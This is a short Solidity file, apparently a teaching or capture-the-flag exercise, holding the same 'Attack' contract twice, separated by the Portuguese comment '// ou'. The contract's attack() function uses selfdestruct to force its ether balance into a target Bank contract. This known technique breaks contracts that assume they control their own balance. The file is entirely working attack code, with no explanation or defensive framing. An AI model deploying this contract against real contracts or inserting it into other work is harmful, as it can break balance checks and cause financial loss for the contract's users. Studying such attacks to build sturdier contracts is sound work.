contract Attack{

    Bank bank;

    constructor (Bank _bank){
        bank = _bank;
    }

    fallback() external payable{}

    function attack() external {
        selfdestruct(payable(address(bank)));
    }

} 

// ou

// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.12;

contract Attack{

    Bank bank;

    constructor (Bank _bank){
        bank = _bank;
    }

    fallback() external payable{}

    function attack() external {
        selfdestruct(payable(address(bank)));
    }

}